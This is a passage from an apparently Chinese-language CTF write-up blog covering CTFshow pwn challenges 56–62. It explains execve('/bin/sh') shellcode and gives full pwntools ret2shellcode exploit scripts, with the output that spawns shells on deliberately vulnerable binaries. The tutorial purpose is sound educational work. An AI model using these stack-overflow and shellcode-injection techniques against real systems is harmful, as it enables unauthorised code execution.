进程。</span><br></pre></td></tr></table></figure><p>总结起来，这段汇编代码的功能是利用系统调用在Linux系统上执行 execve(“&#x2F;bin&#x2F;sh”, NULL,NULL) ，即打开一个新的shell进程。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28159</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn57"><a href="#pwn57" class="headerlink" title="pwn57"></a>pwn57</h2><p>Hint：先了解一下简单的64位shellcode吧</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      No RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX disabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位保护全关</p><p>IDA查看一下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __asm &#123; syscall; LINUX - &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将汇编代码拿出来逐步分析：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push    rax</span><br><span class="line">xor     rdx, rdx</span><br><span class="line">xor     rsi, rsi</span><br><span class="line">mov     rbx, 68732F2F6E69622Fh  </span><br><span class="line">push    rbx</span><br><span class="line">push    rsp</span><br><span class="line">pop     rdi</span><br><span class="line">mov     al, 3Bh ; &#x27;;&#x27;</span><br><span class="line">syscall                 ; LINUX -</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">采用的是小端字节序,逆序</span><br><span class="line">2F 62 69 6E 2F 2F 73 68</span><br><span class="line">/  b  i  n  /  /  s  h</span><br><span class="line">在Linux系统中，路径里连续的斜杠/会被当作单个斜杠来处理。所以，/bin//sh 和/bin/sh 指向的是同一个文件。</span><br></pre></td></tr></table></figure><p>这段代码是x86-64汇编语言的代码，用于在Linux系统上执行 execve(“&#x2F;bin&#x2F;sh”, NULL,NULL) 。让我们逐行解析代码的功能：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rax </span><br><span class="line">#这行代码将 rax 寄存器的值（通常用于存放函数返回值）压入栈中。这里的目的是保留 rax 的值，以便后续使用。</span><br><span class="line">xor rdx, rdx</span><br><span class="line">xor rsi, rsi</span><br><span class="line">#这两行代码使用异或操作将 rdx 和 rsi 寄存器的值设置为零。 rdx 和 rsi 分别将用作 execve系统调用的第三个和第二个参数，即环境变量和命令行参数。在此情况下，我们将它们设置为 NULL，表示没有环境变量和命令行参数。</span><br><span class="line">mov rbx, &#x27;/bin//sh&#x27; </span><br><span class="line">#这行代码将字符串 &#x27;/bin//sh&#x27; 的地址赋值给 rbx 寄存器。字符串 &#x27;/bin//sh&#x27; 是我们要执行的可执行文件的路径。在x86-64汇编中，字符串被当作地址处理。</span><br><span class="line">push rbx </span><br><span class="line">#这行代码将 rbx 寄存器的值（字符串 &#x27;/bin//sh&#x27; 的地址）压入栈中。这是为了将可执行文件路径传递给 execve 系统调用的第一个参数。</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">#这两行代码将栈顶的地址（即字符串&#x27;/bin//sh&#x27;的地址）弹出到rdi寄存器。rdi寄存器将用作execve 系统调用的第一个参数，即可执行文件路径。</span><br><span class="line">mov al, 59 </span><br><span class="line">#这行代码将 al 寄存器设置为值 59 ， 59 是 execve 系统调用的系统调用号。</span><br><span class="line">syscall </span><br><span class="line">#这行代码触发系统调用。通过设置适当的寄存器值（ rax 、rdi、rsi、rdx），syscall指令将执行execve(&quot;/bin/sh&quot;, NULL, NULL) 系统调用，从而启动一个新的 shell 进程。</span><br></pre></td></tr></table></figure><p>总结起来，这段汇编代码的功能是利用系统调用在Linux系统上执行 execve(“&#x2F;bin&#x2F;sh”, NULL,NULL) ，即打开一个新的shell进程。与前一个示例相比，这段代码是x86-64架构下的汇编代码，使用通用寄存器进行操作。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28195</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn58"><a href="#pwn58" class="headerlink" title="pwn58"></a>pwn58</h2><p>Hint：32位 无限制</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位仅部分开启RELRO，其他保护全关，并且有可读，可写，可执行段</p><p>IDA简单分析（这里无法进行反编译，直接看汇编代码）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">s= byte ptr -0A0h</span><br><span class="line">var_C= dword ptr -0Ch</span><br><span class="line">argc= dword ptr  8</span><br><span class="line">argv= dword ptr  0Ch</span><br><span class="line">envp= dword ptr  10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 0A0h</span><br><span class="line">call    __x86_get_pc_thunk_bx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">mov     eax, ds:(stdout_ptr - 804A000h)[ebx]</span><br><span class="line">mov     eax, [eax]</span><br><span class="line">push    0               ; n</span><br><span class="line">push    2               ; modes</span><br><span class="line">push    0               ; buf</span><br><span class="line">push    eax             ; stream</span><br><span class="line">call    _setvbuf</span><br><span class="line">add     esp, 10h</span><br><span class="line">call    _getegid</span><br><span class="line">mov     [ebp+var_C], eax</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">push    [ebp+var_C]</span><br><span class="line">call    _setresgid</span><br><span class="line">add     esp, 10h</span><br><span class="line">call    logo</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, (aJustVeryEasyRe - 804A000h)[ebx] ; &quot;Just very easy ret2shellcode&amp;&amp;32bit&quot;</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, (aAttachIt - 804A000h)[ebx] ; &quot;Attach it!&quot;</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    ctfshow</span><br><span class="line">add     esp, 10h</span><br><span class="line">lea     eax, [ebp+s]</span><br><span class="line">call    eax</span><br><span class="line">mov     eax, 0</span><br><span class="line">lea     esp, [ebp-8]</span><br><span class="line">pop     ecx</span><br><span class="line">pop     ebx</span><br><span class="line">pop     ebp</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 804864C</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure><p>看报错应该是这里无法进行反编译，流程其实也能很清楚的看出来，跟之前差不多，看到后面这里</p><p>调用了ctfshow函数，经验之谈漏洞点应该是在这的 ：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到有gets函数的调用，看汇编：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; int __cdecl ctfshow(char *s)</span><br><span class="line">public ctfshow</span><br><span class="line">ctfshow proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line">s= dword ptr  8</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx</span><br><span class="line">sub     esp, 4</span><br><span class="line">call    __x86_get_pc_thunk_bx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    [ebp+s]         ; s</span><br><span class="line">call    _gets</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    [ebp+s]         ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">nop</span><br><span class="line">mov     ebx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 8048516</span><br><span class="line">ctfshow endp</span><br></pre></td></tr></table></figure><p>我们可以看出对gets函数调用，参数对应的是 [ebp+s] 的地址,也就是在返回地址上一栈内存单元处，对应主函数中，可以看到:gets 函数写入的地址即为 [ebp+s] 对应的地址，同时我们注意到:call 的地址即为 [ebp+s] 所指向的地址到这里思路就很明显了，我们先输入的内容会被 get 读取，存到内存 [ebp+s] 中，然后在函数在后面的时候，会调用这一部分内容。所以我们只要写入 shellcode ，函数后面就会调用 shellcode 。至于[ebp+s] 是指向哪里 ，我们可以看到 main 函数中没有 offset 变量，所以这 [ebp+s] 指的是局部变量，那就是在栈中，而 nx 保护没有开启，所以 shellcode 在栈上也可以执行。</p><p>故我们可以直接使用pwntools的shellcraft模块帮我们生成一个shellcode进行攻击。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28188)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 1340</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Use shellcode to get shell!</span><br><span class="line">    * *************************************</span><br><span class="line">Just very easy ret2shellcode&amp;&amp;32bit</span><br><span class="line">Attach it!</span><br><span class="line">jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814<span class="variable">$ri</span>\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX̀</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn59"><a href="#pwn59" class="headerlink" title="pwn59"></a>pwn59</h2><p>Hint：64位 无限制</p><p><code>分析流程同上，需要注意的是在生成shellcode的时候需要注明架构为64位</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28188)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 1371</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Use shellcode to get shell!</span><br><span class="line">    * *************************************</span><br><span class="line">Just very easy ret2shellcode&amp;&amp;64bit</span><br><span class="line">Attach it!</span><br><span class="line">jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn60"><a href="#pwn60" class="headerlink" title="pwn60"></a>pwn60</h2><p>Hint：入门难度shellcode</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br><span class="line">  Debuginfo:  Yes</span><br></pre></td></tr></table></figure><p>32位保护仅部分开启RELRO，其余保护全关，并且有可读，可写，可执行段</p><p>32位IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;CTFshow-pwn can u pwn me here!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;See you ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有gets函数，还是明显的栈溢出漏洞</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; cyclic 300</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line">See you ~</span><br><span class="line">...</span><br><span class="line">*EIP  0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; cyclic -l daab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;daab&#x27;</span> (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br></pre></td></tr></table></figure><p>下面还使用strncpy函数将对应的字符串复制到 buf2 处。跟进查看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure><p>可以看到buf2在bss段</p><p>gdb查看一下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">     Start        End Perm     Size  Offset File (set vmmap-prefer-relpaths on)</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000       0 pwn</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000       0 pwn</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000    1000 pwn</span><br><span class="line"> 0x9c66000  0x9c88000 rw-p    22000       0 [heap]</span><br></pre></td></tr></table></figure><p> bss 段对应的段没有可执行权限（ubunt18.02可以）</p><p>我们就可以控制程序执行 shellcode，也就是先读入 shellcode，然后控制程序执行 bss 段处的shellcode。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">&#x27;a&#x27;</span>) + p32(buf2_addr) </span><br><span class="line"><span class="comment">#shellcode.ljust(112, &#x27;a&#x27;) ：这是使用ljust函数将 shellcode 字符串填充到长度为112的字符串中，并用字母 &#x27;a&#x27; 填充剩余的空白部分。</span></span><br><span class="line"><span class="comment">#当然，按照之前的写法，我们只需要先将shellcode的长度打印出来，然后让其总长度为112 ，只是我们使用上述函数可以帮助我们一步到位</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">lenth = <span class="built_in">len</span>(shellcode)</span><br><span class="line"><span class="built_in">print</span>(lenth)</span><br><span class="line">payload = shellcode + cyclic(<span class="number">112</span>-lenth) + p32(buf2_addr)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span></span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">buf2_addr=<span class="number">0x0804A080</span></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;a&#x27;</span>)+p32(buf2_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 872</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Stack_Overflow</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : There are backdoor <span class="built_in">functions</span> here!</span><br><span class="line">    * *************************************</span><br><span class="line">Find and use it!</span><br><span class="line">Enter what you want:</span><br><span class="line">flag&#123;just_test_my_process&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn61"><a href="#pwn61" class="headerlink" title="pwn61"></a>pwn61</h2><p>Hint：输出了什么？</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       and64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX diasabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br></pre></td></tr></table></figure><p>64位程序，关闭栈保护、NX保护，有可读可写可执行的段</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *__bss_start; <span class="comment">// rdi</span></span><br><span class="line">  _QWORD v5[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  __bss_start = _bss_start;</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  logo(__bss_start, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to CTFshow!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What&#x27;s this : [%p] ?\n&quot;</span>, v5);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Maybe it&#x27;s useful ! But how to use it?&quot;</span>);</span><br><span class="line">  gets(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v5那里存在栈溢出，程序还把v5的地址值给打印出来了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">低地址 ──────────────────────────────────────► 高地址</span><br><span class="line">[v5缓冲区(16B) | saved rbp(8B) | 返回地址(8B)]</span><br></pre></td></tr></table></figure><p>我们可以先将其接收保存下来，当然，由于开启了PIE保护，该地址会每次变动：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">What<span class="string">&#x27;s this : [0x7ffc4dff34e0] ?</span></span><br><span class="line"><span class="string">$ ./pwn</span></span><br><span class="line"><span class="string">What&#x27;</span>s this : [0x7ffef7a4eb20] ?</span><br></pre></td></tr></table></figure><p>我们只需要在exp中接收，然后将其保存下来，以便与每次我们使用的都是正确的v5的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">v5 = io.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>)</span><br></pre></td></tr></table></figure><ul><li><p>输入流中首先接收数据直到遇到 ‘[‘ 字符为止。</p></li><li><p>接下来再次从输入流中接收数据，直到遇到 ‘]’ 字符为止，将其保存在变量 v5 中。</p></li><li><p>最后，将变量 v5 解析为一个十六进制的整数，并将其存储回变量 v5 中。</p></li></ul><p>这样我们第一步的目的就达到了</p><p>接下来我们接着看：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    _gets</span><br><span class="line">mov     eax, 0</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 7FD</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure><p>leave的作用相当于<strong>MOV SP,BP；POP BP。</strong></p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">move rsp,rbp</span><br><span class="line">rsp = v5_addr + 0x10</span><br><span class="line">POP RBP</span><br><span class="line">rsp = v5_addr + 0x18</span><br><span class="line">因为leave指令会释放栈空间，因此我们不能使用v5后面的24字</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">      /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">      push 0x68</span><br><span class="line">      mov rax, 0x732f2f2f6e69622f</span><br><span class="line">      push rax</span><br><span class="line">      mov rdi, rsp</span><br><span class="line">      /* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">      /* push b&#x27;sh\x00&#x27; */</span><br><span class="line">      push 0x1010101 ^ 0x6873</span><br><span class="line">      xor dword ptr [rsp], 0x1010101</span><br><span class="line">      xor esi, esi /* 0 */</span><br><span class="line">      push rsi /* null terminate */</span><br><span class="line">      push 8</span><br><span class="line">      pop rsi</span><br><span class="line">      add rsi, rsp</span><br><span class="line">      push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">      mov rsi, rsp</span><br><span class="line">      xor edx, edx /* 0 */</span><br><span class="line">      /* call execve() */</span><br><span class="line">      push 59 /* 0x3b */</span><br><span class="line">      pop rax</span><br><span class="line">      syscall</span><br></pre></td></tr></table></figure><p>而生成的shellcode中对rsp进行了其他操作，所以leave指令会对shellcode的执行造成影响。故v5中不能存放shellcode，v5后的8个字节也不能存放（这里需要存放返回地址）。故我们的shellcode只能放在v5首地址后的 24+8后的地址。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">低地址 ──────────────────────────────────────► 高地址</span><br><span class="line">[v5缓冲区(16B) | saved rbp(8B) | 返回地址(8B)]</span><br></pre></td></tr></table></figure><p>构造的payload为：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(v5 + <span class="number">24</span>+<span class="number">8</span>) + shellcode</span><br></pre></td></tr></table></figure><p>这里需要理解一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28205)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[&#x27;</span>)</span><br><span class="line">v5 = io.recvuntil(<span class="string">b&#x27;]&#x27;</span>, drop=<span class="literal">True</span>) <span class="comment">#drop=True是为去掉&quot;]&quot;</span></span><br><span class="line">v5 = <span class="built_in">int</span>(v5, <span class="number">16</span>) <span class="comment">#16进制转换10进制</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = cyclic(<span class="number">0x10</span>+<span class="number">8</span>) + p64(v5 + <span class="number">32</span>) + shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span>: pid 147</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">ctfshow_flag</span><br></pre></td></tr></table></figure><h2 id="pwn62"><a href="#pwn62" class="headerlink" title="pwn62"></a>pwn62</h2><p>Hint：短了一点</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       